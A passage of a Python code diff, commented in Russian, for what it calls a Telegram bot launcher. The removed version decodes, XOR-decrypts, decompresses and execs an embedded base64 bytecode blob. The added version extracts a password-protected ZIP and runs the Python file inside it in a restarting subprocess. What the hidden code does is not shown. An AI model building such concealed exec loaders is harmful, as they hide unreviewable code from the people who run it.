omujz2NDSuSgUTEL2GPJv4Fz3YWSKq2s0QOYvPh95jfYke6C+JfVNGdz5h+Jw8T4dn5VnEJ4QdxtkaFZV9ku2YhEz/LB3YeD3919hwPY6b5QoyILYO9uTRSGCJMR0ShngtCF50beQuUhBIOT5O9YVOP6qSPf+yjDKXAmKvSijmaCrjhAtsUI2nYIkSU2UH27y+7OjzjIajdZt1rYDJ6XX1cODC+fisjbjFh8e7AtD0impZ06OZCVrNnfJktaHFpbUb4K8BWj56qljKV/gr5lKOOokSsqqkNeyR2255VtKQC4E6OZW+IVCElJBaG0HXafnytfkLKpeYyxNf9k4QEJGOqtDRAO8tYm/er7BHrCIs9iDr3qigQZZPbDW4Y1Zo9sxJGu0a9P90r2Z7VH0NviPJIsXH7sCE7ZyKu3kHXSTZ5dcDS4MgVxn810fLjL4FftRI/4h12qiTa/kbl8IezzA5Dy5ABtSYbHgwbbJmq6XycarYBJ8ng+d7+ROV7khzs+StCK9gddWess+JxG7Nf8n5p+8OR9Z8Oamu/gITRzQabPficjdZKhRmyJ9cQAvETsu7YCaUd8kG9rPJCK+ceL0n0dOAsVgeTi84WexQlDsI0cexxY8EeBjoPjezVEEvOgNJU7EtudWldOmdw+qkMuUTwhMJGdJ40HPEEXg6Gc9/B14YGPbqnwA1480+saamU+Biw9/56sktJ3TFjZBbe9IOpwu6wQk5rMRQpKAW1fYzSj+Uwoder6pE7mepfZECUENmtTUHscSG9743rvRTGgFYSQh60XMoJCBiUeFQ0jhvNfTa+P7l/LoXssqUoPpqTJ1C/BPyurXKFteTABkzUm8UqMwKgOWWXU70Gx7bz7uhbF/lA8QjEsWqJVxUTrY1NO2kDG9HP//lSsFqD9wLUa+fGVTmwttzOwYFGs441iCz1BCdkoCfwMkiw6Y5Q80iJwh1m9oFNM5KyzTk9BATvpLYG7dfHC/rs4s3k+qaf"
-    pwd = "32049239420348"
+    # Ищем ZIP файлы
+    zips = [f for f in os.listdir('.') if f.endswith('.zip')]
+    if not zips:
+        print("ZIP файл не найден в текущей директории")
+        return
+    
+    zip_file = zips[0]
+    print(f"Найден ZIP файл: {zip_file}")
+    
+    # Создаем временную директорию для распаковки
+    temp_dir = tempfile.mkdtemp()
+    print(f"Создана временная директория: {temp_dir}")
     
     try:
-        # Дешифровка
-        encrypted = base64.b64decode(data)
-        key = hashlib.md5(pwd.encode()).digest()
+        # Распаковываем архив
+        extract_success = extract_zip(zip_file, temp_dir)
         
-        # XOR дешифровка
-        decrypted = bytearray()
-        for i, byte in enumerate(encrypted):
-            decrypted.append(byte ^ key[i % len(key)])
+        if not extract_success:
+            print("Не удалось распаковать архив")
+            return
         
-        # Декомпрессия
-        decompressed = zlib.decompress(decrypted)
+        # Ищем Python файлы в распакованной директории
+        py_files = find_python_files(temp_dir)
         
-        # Загрузка байт-кода
-        code_obj = marshal.loads(decompressed)
+        if not py_files:
+            print("Python файлы не найдены в распакованном архиве")
+            return
         
-        # Выполнение
-        exec(code_obj)
+        print(f"Найдены Python файлы: {py_files}")
+        
+        # Запускаем основной файл в отдельном процессе
+        run_bot_in_subprocess(py_files, temp_dir)
         
     except Exception as e:
-        print("Ошибка запуска:", str(e))
-        return 1
+        print(f"Произошла ошибка: {e}")
+        import traceback
+        traceback.print_exc()
+
+def extract_zip(zip_file, extract_to):
+    """Распаковывает запароленный ZIP архив"""
+    try:
+        with pyzipper.AESZipFile(zip_file, 'r') as z:
+            # Устанавливаем пароль
+            z.setpassword(ZIP_PASSWORD.encode('utf-8'))
+            
+            # Проверяем архив
+            z.testzip()
+            print("ZIP архив валиден")
+            
+            # Распаковываем все файлы
+            z.extractall(extract_to)
+            print(f"Архив успешно распакован в: {extract_to}")
+            
+            return True
+            
+    except pyzipper.BadZipFile:
+        print("Ошибка: Файл не является ZIP архивом или поврежден")
+        return False
+    except pyzipper.ZipDecryptionError:
+        print("Ошибка: Неверный пароль")
+        return False
+    except Exception as e:
+        print(f"Ошибка при распаковке: {e}")
+        return False
+
+def find_python_files(directory):
+    """Находит все Python файлы в директории и поддиректориях"""
+    python_files = []
     
-    return 0
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith('.py'):
+                full_path = os.path.join(root, file)
+                python_files.append(full_path)
+    
+    return python_files
+
+def select_main_file(py_files):
+    """Выбирает основной файл для запуска по приоритету"""
+    # Приоритет 1: main.py
+    for file in py_files:
+        if os.path.basename(file) == 'main.py':
+            return file
+    
+    # Приоритет 2: __main__.py
+    for file in py_files:
+        if os.path.basename(file) == '__main__.py':
+            return file
+    
+    # Приоритет 3: run.py, start.py, app.py
+    priority_names = ['run.py', 'start.py', 'app.py', 'script.py', 'bot.py', 'tgbot.py']
+    for priority_name in priority_names:
+        for file in py_files:
+            if os.path.basename(file) == priority_name:
+                return file
+    
+    # Приоритет 4: первый файл в корневой директории
+    root_files = [f for f in py_files if os.path.dirname(f) == os.path.dirname(py_files[0])]
+    if root_files:
+        return root_files[0]
+    
+    # Приоритет 5: любой первый файл
+    return py_files[0] if py_files else None
+
+def run_bot_in_subprocess(py_files, temp_dir):
+    """Запускает бота в отдельном subprocess и следит за ним"""
+    main_file = select_main_file(py_files)
+    if not main_file:
+        print("Не удалось выбрать основной файл для запуска")
+        return
+    
+    print(f"Запускаем бота: {main_file}")
+    print("Бот запущен в отдельном процессе...")
+    print("Для остановки нажмите Ctrl+C\n")
+    
+    process = None
+    restart_count = 0
+    max_restarts = 10
+    
+    def signal_handler(sig, frame):
+        """Обработчик Ctrl+C"""
+        nonlocal process
+        print("\n🛑 Останавливаем бота...")
+        if process and process.poll() is None:
+            # Останавливаем процесс и все его дочерние процессы
+            try:
+                parent = psutil.Process(process.pid)
+                children = parent.children(recursive=True)
+                for child in children:
+                    child.terminate()
+                parent.terminate()
+            except:
+                pass
+        sys.exit(0)
+    
+    # Регистрируем обработчик сигнала
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    while restart_count < max_restarts:
+        try:
+            print(f"🚀 Запуск бота (попытка {restart_count + 1}/{max_restarts})...")
+            
+            # Запускаем бота в отдельном процессе
+            process = subprocess.Popen(
+                [sys.executable, main_file],
+                cwd=temp_dir,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                bufsize=1,
+                universal_newlines=True
+            )
+            
+            # Читаем вывод в реальном времени
+            def read_output(pipe, pipe_name):
+                for line in pipe:
+                    print(f"[BOT] {line}", end='')
+            
+            import threading
+            stdout_thread = threading.Thread(target=read_output, args=(process.stdout, "stdout"))
+            stderr_thread = threading.Thread(target=read_output, args=(process.stderr, "stderr"))
+            stdout_thread.daemon = True
+            stderr_thread.daemon = True
+            stdout_thread.start()
+            stderr_thread.start()
+            
+            # Ждем завершения процесса
+            return_code = process.wait()
+            
+            if return_code == 0:
+                print("✅ Бот завершил работу нормально")
+                break
+            else:
+                restart_count += 1
+                print(f"⚠️ Бот завершился с кодом {return_code}. Перезапуск через 5 секунд...")
+                time.sleep(5)
+                
+        except KeyboardInterrupt:
+            signal_handler(signal.SIGINT, None)
+            break
+        except Exception as e:
+            restart_count += 1
+            print(f"❌ Ошибка запуска бота: {e}. Перезапуск через 5 секунд...")
+            time.sleep(5)
+    
+    if restart_count >= max_restarts:
+        print(f"❌ Достигнуто максимальное количество перезапусков ({max_restarts})")
 
 if __name__ == "__main__":
-    exit(main())
+    print("=== 🤖 Telegram Bot Launcher ===")
+    print("Бот будет запущен в отдельном процессе")
+    print("Для остановки нажмите Ctrl+C\n")
+    main()
